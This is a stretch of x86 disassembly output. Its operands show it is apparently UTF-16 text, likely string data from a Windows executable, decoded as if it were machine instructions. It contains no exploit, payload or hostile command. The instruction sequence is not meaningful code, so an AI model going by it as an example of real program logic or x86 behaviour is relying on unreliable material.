  40b68a:	inc    ecx
  40b68b:	add    BYTE PTR [eax+0x0],dh
  40b68e:	jo     0x40b690
  40b690:	ins    BYTE PTR es:[edi],dx
  40b691:	add    BYTE PTR [ecx+0x0],ch
  40b694:	arpl   WORD PTR [eax],ax
  40b696:	popa   
  40b697:	add    BYTE PTR [eax+eax*1+0x69],dh
  40b69b:	add    BYTE PTR [edi+0x0],ch
  40b69e:	outs   dx,BYTE PTR ds:[esi]
  40b69f:	add    BYTE PTR [edi+0x0],al
  40b6a2:	jb     0x40b6a4
  40b6a4:	outs   dx,DWORD PTR ds:[esi]
  40b6a5:	add    BYTE PTR [ebp+0x0],dh
  40b6a8:	jo     0x40b6aa
  40b6aa:	add    BYTE PTR [edi],dl
  40b6ac:	inc    esp
  40b6ad:	add    BYTE PTR [ebp+0x0],ah
  40b6b0:	jae    0x40b6b2
  40b6b2:	arpl   WORD PTR [eax],ax
  40b6b4:	jb     0x40b6b6
  40b6b6:	imul   eax,DWORD PTR [eax],0x740070
  40b6bc:	imul   eax,DWORD PTR [eax],0x6e006f
  40b6c2:	add    BYTE PTR [edi],dl
  40b6c4:	inc    esp
  40b6c5:	add    BYTE PTR [ecx+0x0],ch
  40b6c8:	jae    0x40b6ca
  40b6ca:	jo     0x40b6cc
  40b6cc:	ins    BYTE PTR es:[edi],dx
  40b6cd:	add    BYTE PTR [ecx+0x0],ah
  40b6d0:	jns    0x40b6d2
  40b6d2:	dec    esi
  40b6d3:	add    BYTE PTR [ecx+0x0],ah
  40b6d6:	ins    DWORD PTR es:[edi],dx
  40b6d7:	add    BYTE PTR [ebp+0x0],ah
  40b6da:	add    BYTE PTR [ecx],cl
  40b6dc:	inc    esp
  40b6dd:	add    BYTE PTR [edi+0x0],ch
  40b6e0:	outs   dx,BYTE PTR ds:[esi]
  40b6e1:	add    BYTE PTR [ebp+0x0],ah
  40b6e4:	add    BYTE PTR [ebx],ch
  40b6e6:	inc    ebp
  40b6e7:	add    BYTE PTR [ebp+0x0],ch
  40b6ea:	jo     0x40b6ec
  40b6ec:	je     0x40b6ee
  40b6ee:	jns    0x40b6f0
  40b6f0:	inc    ebx
  40b6f1:	add    BYTE PTR [edi+0x0],ch
  40b6f4:	ins    DWORD PTR es:[edi],dx
  40b6f5:	add    BYTE PTR [ebp+0x0],ch
  40b6f8:	popa   
  40b6f9:	add    BYTE PTR [esi+0x0],ch
  40b6fc:	add    BYTE PTR fs:[eax+0x0],dl
  40b700:	popa   
  40b701:	add    BYTE PTR [edx+0x0],dh
  40b704:	popa   
  40b705:	add    BYTE PTR [ebp+0x0],ch
  40b708:	add    BYTE PTR gs:[eax+eax*1+0x65],dh
  40b70d:	add    BYTE PTR [edx+0x0],dh
  40b710:	add    BYTE PTR [ebx],dh
  40b712:	inc    ebp
  40b713:	add    BYTE PTR [ebp+0x0],ch
  40b716:	jo     0x40b718
  40b718:	je     0x40b71a
  40b71a:	jns    0x40b71c
  40b71c:	inc    ebx
  40b71d:	add    BYTE PTR [edi+0x0],ch
  40b720:	ins    DWORD PTR es:[edi],dx
  40b721:	add    BYTE PTR [ebp+0x0],ch
  40b724:	popa   
  40b725:	add    BYTE PTR [esi+0x0],ch
  40b728:	add    BYTE PTR fs:[ebx+0x0],dl
  40b72c:	ja     0x40b72e
  40b72e:	imul   eax,DWORD PTR [eax],0x630074
  40b734:	push   0x67004900
  40b739:	add    BYTE PTR [esi+0x0],ch
  40b73c:	outs   dx,DWORD PTR ds:[esi]
  40b73d:	add    BYTE PTR [edx+0x0],dh
  40b740:	add    BYTE PTR gs:[eax+eax*1+0x0],ah
  40b745:	inc    edi
  40b746:	inc    ebp
  40b747:	add    BYTE PTR [ebp+0x0],ch
  40b74a:	jo     0x40b74c
  40b74c:	je     0x40b74e
  40b74e:	jns    0x40b750
  40b750:	inc    ebx
  40b751:	add    BYTE PTR [edi+0x0],ch
  40b754:	ins    DWORD PTR es:[edi],dx
  40b755:	add    BYTE PTR [ebp+0x0],ch
  40b758:	popa   
  40b759:	add    BYTE PTR [esi+0x0],ch
  40b75c:	add    BYTE PTR fs:[ebx+0x0],dl
  40b760:	ja     0x40b762
  40b762:	imul   eax,DWORD PTR [eax],0x630074
  40b768:	push   0x69005700
  40b76d:	add    BYTE PTR [eax+eax*1+0x68],dh
  40b771:	add    BYTE PTR [eax+eax*1+0x6f],al
  40b775:	add    BYTE PTR [ebp+0x0],ch
  40b778:	popa   
  40b779:	add    BYTE PTR [ecx+0x0],ch
  40b77c:	outs   dx,BYTE PTR ds:[esi]
  40b77d:	add    BYTE PTR [ecx+0x0],cl
  40b780:	add    BYTE PTR [bp+0x0],ch
  40b784:	outs   dx,DWORD PTR ds:[esi]
  40b785:	add    BYTE PTR [edx+0x0],dh
  40b788:	add    BYTE PTR gs:[eax+eax*1+0x0],ah
  40b78d:	sbb    eax,DWORD PTR [ebp+0x0]
  40b790:	ins    DWORD PTR es:[edi],dx
  40b791:	add    BYTE PTR [eax+0x0],dh
  40b794:	je     0x40b796
  40b796:	jns    0x40b798
  40b798:	push   ebx
  40b799:	add    BYTE PTR [edi+0x0],dh
  40b79c:	imul   eax,DWORD PTR [eax],0x630074
  40b7a2:	push   0x73006500
  40b7a7:	add    BYTE PTR [eax],al
  40b7a9:	or     eax,DWORD PTR [ebp+0x0]
  40b7ac:	jb     0x40b7ae
  40b7ae:	jb     0x40b7b0
  40b7b0:	outs   dx,DWORD PTR ds:[esi]
  40b7b1:	add    BYTE PTR [edx+0x0],dh
  40b7b4:	add    BYTE PTR ds:0x6c0047,cl
  40b7ba:	outs   dx,DWORD PTR ds:[esi]
  40b7bb:	add    BYTE PTR [edx+0x0],ah
  40b7be:	popa   
  40b7bf:	add    BYTE PTR [eax+eax*1+0x0],ch
  40b7c3:	adc    eax,DWORD PTR [edi+0x0]
  40b7c6:	jb     0x40b7c8
  40b7c8:	outs   dx,DWORD PTR ds:[esi]
  40b7c9:	add    BYTE PTR [ebp+0x0],dh
  40b7cc:	jo     0x40b7ce
  40b7ce:	push   esp
  40b7cf:	add    BYTE PTR [ecx+0x0],bh
  40b7d2:	jo     0x40b7d4
  40b7d4:	add    BYTE PTR gs:[eax],al
  40b7d7:	sbb    DWORD PTR [eax+0x0],ecx
  40b7da:	add    BYTE PTR gs:[eax+eax*1+0x70],ch
  40b7df:	add    BYTE PTR [ebx+0x0],al
  40b7e2:	outs   dx,DWORD PTR ds:[esi]
  40b7e3:	add    BYTE PTR [ebp+0x0],ch
  40b7e6:	ins    DWORD PTR es:[edi],dx
  40b7e7:	add    BYTE PTR [ecx+0x0],ah
  40b7ea:	outs   dx,BYTE PTR ds:[esi]
  40b7eb:	add    BYTE PTR [eax+eax*1+0x73],ah
  40b7ef:	add    BYTE PTR [eax],al
  40b7f1:	adc    eax,0x650048
  40b7f6:	ins    BYTE PTR es:[edi],dx
  40b7f7:	add    BYTE PTR [eax+0x0],dh
  40b7fa:	inc    esp
  40b7fb:	add    BYTE PTR [edi+0x0],ch
  40b7fe:	ins    DWORD PTR es:[edi],dx
  40b7ff:	add    BYTE PTR [ecx+0x0],ah
  40b802:	imul   eax,DWORD PTR [eax],0x1900006e
  40b808:	dec    eax
  40b809:	add    BYTE PTR [ebp+0x0],ah
  40b80c:	ins    BYTE PTR es:[edi],dx
  40b80d:	add    BYTE PTR [eax+0x0],dh
  40b810:	dec    ecx
  40b811:	add    BYTE PTR [eax+eax*1+0x65],ah
  40b815:	add    BYTE PTR [esi+0x0],ch
  40b818:	je     0x40b81a
  40b81a:	imul   eax,DWORD PTR [eax],0x790074
  40b820:	add    BYTE PTR [ecx],bl
  40b822:	dec    eax
  40b823:	add    BYTE PTR [ebp+0x0],ah
  40b826:	ins    BYTE PTR es:[edi],dx
  40b827:	add    BYTE PTR [eax+0x0],dh
  40b82a:	push   ebx
  40b82b:	add    BYTE PTR [ebp+0x0],ah
  40b82e:	arpl   WORD PTR [eax],ax
  40b830:	jne    0x40b832
  40b832:	jb     0x40b834
  40b834:	imul   eax,DWORD PTR [eax],0x790074
  40b83a:	add    BYTE PTR [ebx],dl
  40b83c:	dec    eax
  40b83d:	add    BYTE PTR [ebp+0x0],ah
  40b840:	ins    BYTE PTR es:[edi],dx
  40b841:	add    BYTE PTR [eax+0x0],dh
  40b844:	push   esp
  40b845:	add    BYTE PTR [ecx+0x0],bh
  40b848:	jo     0x40b84a
  40b84a:	add    BYTE PTR gs:[ebx+0x0],dh
  40b84e:	add    BYTE PTR [ecx],dh
  40b850:	dec    ecx
  40b851:	add    BYTE PTR [eax+eax*1+0x65],ah
  40b855:	add    BYTE PTR [esi+0x0],ch
  40b858:	je     0x40b85a
  40b85a:	imul   eax,DWORD PTR [eax],0x790074
  40b860:	inc    ebx
  40b861:	add    BYTE PTR [ecx+0x0],ah
  40b864:	outs   dx,BYTE PTR ds:[esi]
  40b865:	add    BYTE PTR [esi+0x0],ch
  40b868:	outs   dx,DWORD PTR ds:[esi]
  40b869:	add    BYTE PTR [eax+eax*1+0x42],dh
  40b86d:	add    BYTE PTR [ebp+0x0],ah
  40b870:	push   edx
  40b871:	add    BYTE PTR [ebp+0x0],ah
  40b874:	jae    0x40b876
  40b876:	outs   dx,DWORD PTR ds:[esi]
  40b877:	add    BYTE PTR [eax+eax*1+0x76],ch
  40b87b:	add    BYTE PTR [ebp+0x0],ah
  40b87e:	add    BYTE PTR fs:[eax],al
  40b881:	sbb    DWORD PTR [ecx+0x0],ecx
  40b884:	add    BYTE PTR fs:[ebp+0x0],ah
  40b888:	outs   dx,BYTE PTR ds:[esi]
  40b889:	add    BYTE PTR [eax+eax*1+0x69],dh
  40b88d:	add    BYTE PTR [eax+eax*1+0x79],dh
  40b891:	add    BYTE PTR [eax+eax*1+0x79],dl
  40b895:	add    BYTE PTR [eax+0x0],dh
  40b898:	add    BYTE PTR gs:[eax],al
  40b89b:	cmp    eax,0x6e0049
  40b8a0:	jae    0x40b8a2
  40b8a2:	jne    0x40b8a4
  40b8a4:	data16 add BYTE PTR [esi+0x0],ah
  40b8a8:	imul   eax,DWORD PTR [eax],0x690063
  40b8ae:	add    BYTE PTR gs:[esi+0x0],ch
  40b8b2:	je     0x40b8b4
  40b8b4:	dec    esi
  40b8b5:	add    BYTE PTR [ebp+0x0],dh
  40b8b8:	ins    DWORD PTR es:[edi],dx
  40b8b9:	add    BYTE PTR [edx+0x0],ah
  40b8bc:	add    BYTE PTR gs:[edx+0x0],dh
  40b8c0:	dec    edi
  40b8c1:	add    BYTE PTR [esi+0x0],ah
  40b8c4:	push   eax
  40b8c5:	add    BYTE PTR [ecx+0x0],ah
  40b8c8:	jb     0x40b8ca
  40b8ca:	popa   
  40b8cb:	add    BYTE PTR [ebp+0x0],ch
  40b8ce:	add    BYTE PTR gs:[eax+eax*1+0x65],dh
  40b8d3:	add    BYTE PTR [edx+0x0],dh
  40b8d6:	jae    0x40b8d8
  40b8d8:	add    BYTE PTR [edi],cl
  40b8da:	dec    ecx
  40b8db:	add    BYTE PTR [esi+0x0],ch
  40b8de:	jbe    0x40b8e0
  40b8e0:	popa   
  40b8e1:	add    BYTE PTR [eax+eax*1+0x69],ch
  40b8e5:	add    BYTE PTR [eax+eax*1+0x0],ah
  40b8e9:	cmp    ecx,DWORD PTR [ecx+0x0]
  40b8ec:	outs   dx,BYTE PTR ds:[esi]
  40b8ed:	add    BYTE PTR [esi+0x0],dh
  40b8f0:	popa   
  40b8f1:	add    BYTE PTR [eax+eax*1+0x69],ch
  40b8f5:	add    BYTE PTR [eax+eax*1+0x41],ah
  40b8f9:	add    BYTE PTR [ebx+0x0],ah
  40b8fc:	arpl   WORD PTR [eax],ax
  40b8fe:	add    BYTE PTR gs:[ebx+0x0],dh
  40b902:	jae    0x40b904
  40b904:	inc    ebx
  40b905:	add    BYTE PTR [edi+0x0],ch
  40b908:	outs   dx,BYTE PTR ds:[esi]
  40b909:	add    BYTE PTR [eax+eax*1+0x72],dh
  40b90d:	add    BYTE PTR [edi+0x0],ch
  40b910:	ins    BYTE PTR es:[edi],dx
  40b911:	add    BYTE PTR [ebp+0x0],al
  40b914:	js     0x40b916
  40b916:	arpl   WORD PTR [eax],ax
  40b918:	add    BYTE PTR gs:[eax+0x0],dh
  40b91c:	je     0x40b91e
  40b91e:	imul   eax,DWORD PTR [eax],0x6e006f
  40b924:	add    BYTE PTR [ebx],bl
  40b926:	dec    ecx
  40b927:	add    BYTE PTR [esi+0x0],ch
  40b92a:	jbe    0x40b92c
  40b92c:	popa   
  40b92d:	add    BYTE PTR [eax+eax*1+0x69],ch
  40b931:	add    BYTE PTR [eax+eax*1+0x41],ah
  40b935:	add    BYTE PTR [ebx+0x0],ah
  40b938:	je     0x40b93a
  40b93a:	imul   eax,DWORD PTR [eax],0x6e006f
  40b940:	add    BYTE PTR [edi],dh
  40b942:	dec    ecx
  40b943:	add    BYTE PTR [esi+0x0],ch
  40b946:	jbe    0x40b948
  40b948:	popa   
  40b949:	add    BYTE PTR [eax+eax*1+0x69],ch
  40b94d:	add    BYTE PTR [eax+eax*1+0x43],ah
  40b951:	add    BYTE PTR [edi+0x0],ch
  40b954:	ins    DWORD PTR es:[edi],dx
  40b955:	add    BYTE PTR [ebp+0x0],ch
  40b958:	popa   
  40b959:	add    BYTE PTR [esi+0x0],ch
  40b95c:	add    BYTE PTR fs:[ebx+0x0],dl
  40b960:	ja     0x40b962
  40b962:	imul   eax,DWORD PTR [eax],0x630074
  40b968:	push   0x67004900
  40b96d:	add    BYTE PTR [esi+0x0],ch
  40b970:	outs   dx,DWORD PTR ds:[esi]
  40b971:	add    BYTE PTR [edx+0x0],dh
  40b974:	add    BYTE PTR gs:[eax+eax*1+0x0],ah
  40b979:	pop    ds
  40b97a:	dec    ecx
  40b97b:	add    BYTE PTR [esi+0x0],ch
  40b97e:	jbe    0x40b980
  40b980:	popa   
  40b981:	add    BYTE PTR [eax+eax*1+0x69],ch
  40b985:	add    BYTE PTR [eax+eax*1+0x4e],ah
  40b989:	add    BYTE PTR [edi+0x0],ch
  40b98c:	push   ebx
  40b98d:	add    BYTE PTR [ebp+0x0],ah
  40b990:	jb     0x40b992
  40b992:	jbe    0x40b994
  40b994:	add    BYTE PTR gs:[edx+0x0],dh
  40b998:	add    BYTE PTR [edi],ch
  40b99a:	dec    ecx
  40b99b:	add    BYTE PTR [esi+0x0],ch
  40b99e:	jbe    0x40b9a0
  40b9a0:	popa   
  40b9a1:	add    BYTE PTR [eax+eax*1+0x69],ch
  40b9a5:	add    BYTE PTR [eax+eax*1+0x52],ah
  40b9a9:	add    BYTE PTR [ebp+0x0],ah
  40b9ac:	je     0x40b9ae
  40b9ae:	jne    0x40b9b0
  40b9b0:	jb     0x40b9b2
  40b9b2:	outs   dx,BYTE PTR ds:[esi]
  40b9b3:	add    BYTE PTR [ebp+0x0],ah
  40b9b6:	add    BYTE PTR fs:[ecx+0x0],cl
  40b9ba:	add    BYTE PTR fs:[ebp+0x0],ah
  40b9be:	outs   dx,BYTE PTR ds:[esi]
  40b9bf:	add    BYTE PTR [eax+eax*1+0x69],dh
  40b9c3:	add    BYTE PTR [eax+eax*1+0x79],dh
  40b9c7:	add    BYTE PTR [eax],al
  40b9c9:	sub    eax,0x6e0049
  40b9ce:	jbe    0x40b9d0
  40b9d0:	popa   
  40b9d1:	add    BYTE PTR [eax+eax*1+0x69],ch
  40b9d5:	add    BYTE PTR [eax+eax*1+0x53],ah
  40b9d9:	add    BYTE PTR [edi+0x0],dh
  40b9dc:	imul   eax,DWORD PTR [eax],0x630074
  40b9e2:	push   0x73006500
  40b9e7:	add    BYTE PTR [ecx+0x0],cl
  40b9ea:	add    BYTE PTR [bp+0x0],ch
  40b9ee:	outs   dx,DWORD PTR ds:[esi]
  40b9ef:	add    BYTE PTR [edx+0x0],dh
  40b9f2:	add    BYTE PTR gs:[eax+eax*1+0x0],ah
  40b9f7:	add    eax,0x730049
  40b9fc:	add    BYTE PTR [ebx],cl
  40b9fe:	dec    ecx
  40b9ff:	add    BYTE PTR [ebx+0x0],dh
  40ba02:	dec    esi
  40ba03:	add    BYTE PTR [edi+0x0],ch
  40ba06:	je     0x40ba08
  40ba08:	add    BYTE PTR ds:0x65004c,bl
  40ba0e:	add    BYTE PTR [bx+di+0x0],ah
  40ba12:	ins    BYTE PTR es:[edi],dx
  40ba13:	add    BYTE PTR [ebx+0x0],dl
  40ba16:	je     0x40ba18
  40ba18:	popa   
  40ba19:	add    BYTE PTR [eax+eax*1+0x65],dh
  40ba1d:	add    BYTE PTR [ebp+0x0],ch
  40ba20:	add    BYTE PTR gs:[esi+0x0],ch
  40ba24:	je     0x40ba26
  40ba26:	add    BYTE PTR [ebx],dl
  40ba28:	dec    esp
  40ba29:	add    BYTE PTR [edi+0x0],ch
  40ba2c:	add    BYTE PTR [bx+0x0],ch
  40ba30:	outs   dx,BYTE PTR ds:[esi]
  40ba31:	add    BYTE PTR [esi+0x0],cl
  40ba34:	popa   
  40ba35:	add    BYTE PTR [ebp+0x0],ch
  40ba38:	add    BYTE PTR gs:[eax],al
  40ba3b:	pop    ss
  40ba3c:	dec    ebp
  40ba3d:	add    BYTE PTR [ecx+0x0],ah
  40ba40:	imul   eax,DWORD PTR [eax],0x41006c
  40ba46:	add    BYTE PTR fs:[eax+eax*1+0x72],ah
  40ba4b:	add    BYTE PTR [ebp+0x0],ah
  40ba4e:	jae    0x40ba50
  40ba50:	jae    0x40ba52
  40ba52:	add    BYTE PTR [ecx],dl
  40ba54:	dec    ebp
  40ba55:	add    BYTE PTR [ebp+0x0],ah
  40ba58:	ins    DWORD PTR es:[edi],dx
  40ba59:	add    BYTE PTR [edx+0x0],ah
  40ba5c:	add    BYTE PTR gs:[edx+0x0],dh
  40ba60:	dec    edi
  40ba61:	add    BYTE PTR [esi+0x0],ah
  40ba64:	add    BYTE PTR [edi],cl
  40ba66:	dec    ebp
  40ba67:	add    BYTE PTR [ebp+0x0],ah
  40ba6a:	ins    DWORD PTR es:[edi],dx
  40ba6b:	add    BYTE PTR [edx+0x0],ah
  40ba6e:	add    BYTE PTR gs:[edx+0x0],dh
  40ba72:	jae    0x40ba74
  40ba74:	add    BYTE PTR ds:0x6f004e,ah
  40ba7a:	inc    ebx
  40ba7b:	add    BYTE PTR [edi+0x0],ch
  40ba7e:	ins    DWORD PTR es:[edi],dx
  40ba7f:	add    BYTE PTR [ebp+0x0],ch
  40ba82:	popa   
  40ba83:	add    BYTE PTR [esi+0x0],ch
  40ba86:	add    BYTE PTR fs:[eax+eax*1+0x6f],dl
  40ba8b:	add    BYTE PTR [ebp+0x0],al
  40ba8e:	js     0x40ba90
  40ba90:	add    BYTE PTR gs:[ebx+0x0],ah
  40ba94:	jne    0x40ba96
  40ba96:	je     0x40ba98
  40ba98:	add    BYTE PTR gs:[eax],al
  40ba9b:	daa    
  40ba9c:	dec    esi
  40ba9d:	add    BYTE PTR [edi+0x0],ch
  40baa0:	je     0x40baa2
  40baa2:	inc    ecx
  40baa3:	add    BYTE PTR [eax+0x0],dh
  40baa6:	jo     0x40baa8
  40baa8:	ins    BYTE PTR es:[edi],dx
  40baa9:	add    BYTE PTR [ecx+0x0],ch
  40baac:	arpl   WORD PTR [eax],ax
  40baae:	popa   
  40baaf:	add    BYTE PTR [eax+eax*1+0x69],dh
  40bab3:	add    BYTE PTR [edi+0x0],ch
  40bab6:	outs   dx,BYTE PTR ds:[esi]
  40bab7:	add    BYTE PTR [edi+0x0],al
  40baba:	jb     0x40babc
  40babc:	outs   dx,DWORD PTR ds:[esi]
  40babd:	add    BYTE PTR [ebp+0x0],dh
  40bac0:	jo     0x40bac2
  40bac2:	add    BYTE PTR [ecx],bl
  40bac4:	dec    esi
  40bac5:	add    BYTE PTR [ebp+0x0],dh
  40bac8:	ins    BYTE PTR es:[edi],dx
  40bac9:	add    BYTE PTR [eax+eax*1+0x49],ch
  40bacd:	add    BYTE PTR [eax+eax*1+0x65],ah
  40bad1:	add    BYTE PTR [esi+0x0],ch
  40bad4:	je     0x40bad6
  40bad6:	imul   eax,DWORD PTR [eax],0x790074
  40badc:	add    BYTE PTR [ecx],bl
  40bade:	push   eax
  40badf:	add    BYTE PTR [edx+0x0],dh
  40bae2:	outs   dx,DWORD PTR ds:[esi]
  40bae3:	add    BYTE PTR [edx+0x0],ch
  40bae6:	add    BYTE PTR gs:[ebx+0x0],ah
  40baea:	je     0x40baec
  40baec:	push   ebx
  40baed:	add    BYTE PTR [ebx+0x0],ah
  40baf0:	outs   dx,DWORD PTR ds:[esi]
  40baf1:	add    BYTE PTR [eax+0x0],dh
  40baf4:	add    BYTE PTR gs:[eax],al
  40baf7:	xor    DWORD PTR [ecx+0x0],edx
  40bafa:	inc    ecx
  40bafb:	add    BYTE PTR [ecx+0x0],al
  40bafe:	jne    0x40bb00
  40bb00:	je     0x40bb02
  40bb02:	outs   dx,DWORD PTR ds:[esi]
  40bb03:	add    BYTE PTR [ebp+0x0],ch
  40bb06:	popa   
  40bb07:	add    BYTE PTR [eax+eax*1+0x69],dh
  40bb0b:	add    BYTE PTR [edi+0x0],ch
  40bb0e:	outs   dx,BYTE PTR ds:[esi]
  40bb0f:	add    BYTE PTR [ebp+0x0],cl
  40bb12:	outs   dx,DWORD PTR ds:[esi]
  40bb13:	add    BYTE PTR [eax+eax*1+0x65],ah
  40bb17:	add    BYTE PTR [eax+eax*1+0x45],ch
  40bb1b:	add    BYTE PTR [esi+0x0],ch
  40bb1e:	popa   
  40bb1f:	add    BYTE PTR [edx+0x0],ah
  40bb22:	ins    BYTE PTR es:[edi],dx
  40bb23:	add    BYTE PTR [ebp+0x0],ah
  40bb26:	add    BYTE PTR fs:[eax],al
  40bb29:	xor    eax,0x650052
  40bb2e:	ins    DWORD PTR es:[edi],dx
  40bb2f:	add    BYTE PTR [edi+0x0],ch
  40bb32:	jbe    0x40bb34
  40bb34:	imul   eax,DWORD PTR [eax],0x67006e
  40bb3a:	inc    ecx
  40bb3b:	add    BYTE PTR [ebx+0x0],ah
  40bb3e:	arpl   WORD PTR [eax],ax
  40bb40:	add    BYTE PTR gs:[ebx+0x0],dh
  40bb44:	jae    0x40bb46
  40bb46:	inc    ebx
  40bb47:	add    BYTE PTR [edi+0x0],ch
  40bb4a:	outs   dx,BYTE PTR ds:[esi]
  40bb4b:	add    BYTE PTR [eax+eax*1+0x72],dh
  40bb4f:	add    BYTE PTR [edi+0x0],ch
  40bb52:	ins    BYTE PTR es:[edi],dx
  40bb53:	add    BYTE PTR [ebp+0x0],al
  40bb56:	outs   dx,BYTE PTR ds:[esi]
  40bb57:	add    BYTE PTR [eax+eax*1+0x72],dh
  40bb5b:	add    BYTE PTR [ecx+0x0],bh
  40bb5e:	add    BYTE PTR [edi],ch
  40bb60:	push   edx
  40bb61:	add    BYTE PTR [ebp+0x0],ah
  40bb64:	ins    DWORD PTR es:[edi],dx
  40bb65:	add    BYTE PTR [edi+0x0],ch
  40bb68:	jbe    0x40bb6a
  40bb6a:	imul   eax,DWORD PTR [eax],0x67006e
  40bb70:	dec    ebp
  40bb71:	add    BYTE PTR [ebp+0x0],ah
  40bb74:	ins    DWORD PTR es:[edi],dx
  40bb75:	add    BYTE PTR [edx+0x0],ah
  40bb78:	add    BYTE PTR gs:[edx+0x0],dh
  40bb7c:	inc    esi
  40bb7d:	add    BYTE PTR [edx+0x0],dh
  40bb80:	outs   dx,DWORD PTR ds:[esi]
  40bb81:	add    BYTE PTR [ebp+0x0],ch
  40bb84:	inc    edi
  40bb85:	add    BYTE PTR [edx+0x0],dh
  40bb88:	outs   dx,DWORD PTR ds:[esi]
  40bb89:	add    BYTE PTR [ebp+0x0],dh
  40bb8c:	jo     0x40bb8e
  40bb8e:	add    BYTE PTR [ecx],dh
  40bb90:	push   edx
  40bb91:	add    BYTE PTR [ebp+0x0],ah
  40bb94:	outs   dx,BYTE PTR ds:[esi]
  40bb95:	add    BYTE PTR [ecx+0x0],ah
  40bb98:	ins    DWORD PTR es:[edi],dx
  40bb99:	add    BYTE PTR [ecx+0x0],ch
  40bb9c:	outs   dx,BYTE PTR ds:[esi]
  40bb9d:	add    BYTE PTR [edi+0x0],ah
  40bba0:	inc    ecx
  40bba1:	add    BYTE PTR [eax+0x0],dh
  40bba4:	jo     0x40bba6
  40bba6:	ins    BYTE PTR es:[edi],dx
  40bba7:	add    BYTE PTR [ecx+0x0],ch
  40bbaa:	arpl   WORD PTR [eax],ax
  40bbac:	popa   
  40bbad:	add    BYTE PTR [eax+eax*1+0x69],dh
  40bbb1:	add    BYTE PTR [edi+0x0],ch
  40bbb4:	outs   dx,BYTE PTR ds:[esi]
  40bbb5:	add    BYTE PTR [edi+0x0],al
  40bbb8:	jb     0x40bbba
  40bbba:	outs   dx,DWORD PTR ds:[esi]
  40bbbb:	add    BYTE PTR [ebp+0x0],dh
  40bbbe:	jo     0x40bbc0
  40bbc0:	add    BYTE PTR [ebx],ah
  40bbc2:	push   edx
  40bbc3:	add    BYTE PTR [ebp+0x0],ah
  40bbc6:	jae    0x40bbc8
  40bbc8:	outs   dx,DWORD PTR ds:[esi]
  40bbc9:	add    BYTE PTR [eax+eax*1+0x76],ch
  40bbcd:	add    BYTE PTR [ecx+0x0],ch
  40bbd0:	outs   dx,BYTE PTR ds:[esi]
  40bbd1:	add    BYTE PTR [edi+0x0],ah
  40bbd4:	dec    ecx
  40bbd5:	add    BYTE PTR [eax+eax*1+0x65],ah
  40bbd9:	add    BYTE PTR [esi+0x0],ch
  40bbdc:	je     0x40bbde
  40bbde:	imul   eax,DWORD PTR [eax],0x790074
  40bbe4:	add    BYTE PTR [edi],dh
  40bbe6:	push   edx
  40bbe7:	add    BYTE PTR [ebp+0x0],ah
  40bbea:	je     0x40bbec
  40bbec:	jb     0x40bbee
  40bbee:	imul   eax,DWORD PTR [eax],0x760065
  40bbf4:	imul   eax,DWORD PTR [eax],0x67006e
  40bbfa:	inc    ecx
  40bbfb:	add    BYTE PTR [ebx+0x0],ah
  40bbfe:	arpl   WORD PTR [eax],ax
  40bc00:	add    BYTE PTR gs:[ebx+0x0],dh
  40bc04:	jae    0x40bc06
  40bc06:	inc    ebx
  40bc07:	add    BYTE PTR [edi+0x0],ch
  40bc0a:	outs   dx,BYTE PTR ds:[esi]
  40bc0b:	add    BYTE PTR [eax+eax*1+0x72],dh
  40bc0f:	add    BYTE PTR [edi+0x0],ch
  40bc12:	ins    BYTE PTR es:[edi],dx
  40bc13:	add    BYTE PTR [eax+eax*1+0x69],cl
  40bc17:	add    BYTE PTR [ebx+0x0],dh
  40bc1a:	je     0x40bc1c
  40bc1c:	add    BYTE PTR [edi],dh
  40bc1e:	push   edx
  40bc1f:	add    BYTE PTR [ebp+0x0],ah
  40bc22:	je     0x40bc24
  40bc24:	jb     0x40bc26
  40bc26:	imul   eax,DWORD PTR [eax],0x760065
  40bc2c:	imul   eax,DWORD PTR [eax],0x67006e
  40bc32:	inc    ecx
  40bc33:	add    BYTE PTR [eax+0x0],dh
  40bc36:	jo     0x40bc38
  40bc38:	ins    BYTE PTR es:[edi],dx
  40bc39:	add    BYTE PTR [ecx+0x0],ch
  40bc3c:	arpl   WORD PTR [eax],ax
  40bc3e:	popa   
  40bc3f:	add    BYTE PTR [eax+eax*1+0x69],dh
  40bc43:	add    BYTE PTR [edi+0x0],ch
  40bc46:	outs   dx,BYTE PTR ds:[esi]
  40bc47:	add    BYTE PTR [edi+0x0],al
  40bc4a:	jb     0x40bc4c
  40bc4c:	outs   dx,DWORD PTR ds:[esi]
  40bc4d:	add    BYTE PTR [ebp+0x0],dh
  40bc50:	jo     0x40bc52
  40bc52:	jae    0x40bc54
  40bc54:	add    BYTE PTR [ebx],bh
  40bc56:	push   ebx
  40bc57:	add    BYTE PTR [ebp+0x0],ah
  40bc5a:	arpl   WORD PTR [eax],ax
  40bc5c:	jne    0x40bc5e
  40bc5e:	jb     0x40bc60
  40bc60:	imul   eax,DWORD PTR [eax],0x790074
  40bc66:	dec    esi
  40bc67:	add    BYTE PTR [ecx+0x0],ah
  40bc6a:	ins    DWORD PTR es:[edi],dx
  40bc6b:	add    BYTE PTR [ebp+0x0],ah
  40bc6e:	jae    0x40bc70
  40bc70:	jo     0x40bc72
  40bc72:	popa   
  40bc73:	add    BYTE PTR [ebx+0x0],ah
  40bc76:	add    BYTE PTR gs:[eax+eax*1+0x6f],al
  40bc7b:	add    BYTE PTR [ebp+0x0],ah
  40bc7e:	jae    0x40bc80
  40bc80:	dec    esi
  40bc81:	add    BYTE PTR [edi+0x0],ch
  40bc84:	je     0x40bc86
  40bc86:	inc    ebp
  40bc87:	add    BYTE PTR [eax+0x0],bh
  40bc8a:	imul   eax,DWORD PTR [eax],0x740073
  40bc90:	add    BYTE PTR [edi],dl
  40bc92:	push   ebx
  40bc93:	add    BYTE PTR [eax+0x0],ch
  40bc96:	outs   dx,DWORD PTR ds:[esi]
  40bc97:	add    BYTE PTR [edi+0x0],dh
  40bc9a:	inc    ecx
  40bc9b:	add    BYTE PTR [ebx+0x0],ah
  40bc9e:	je     0x40bca0
  40bca0:	imul   eax,DWORD PTR [eax],0x6e006f
  40bca6:	jae    0x40bca8
  40bca8:	add    BYTE PTR ds:0x680053,bl
  40bcae:	outs   dx,DWORD PTR ds:[esi]
  40bcaf:	add    BYTE PTR [edi+0x0],dh
  40bcb2:	dec    esi
  40bcb3:	add    BYTE PTR [ecx+0x0],ah
  40bcb6:	ins    DWORD PTR es:[edi],dx
  40bcb7:	add    BYTE PTR [ebp+0x0],ah
  40bcba:	jae    0x40bcbc
  40bcbc:	jo     0x40bcbe
  40bcbe:	popa   
  40bcbf:	add    BYTE PTR [ebx+0x0],ah
  40bcc2:	add    BYTE PTR gs:[ebx+0x0],dh
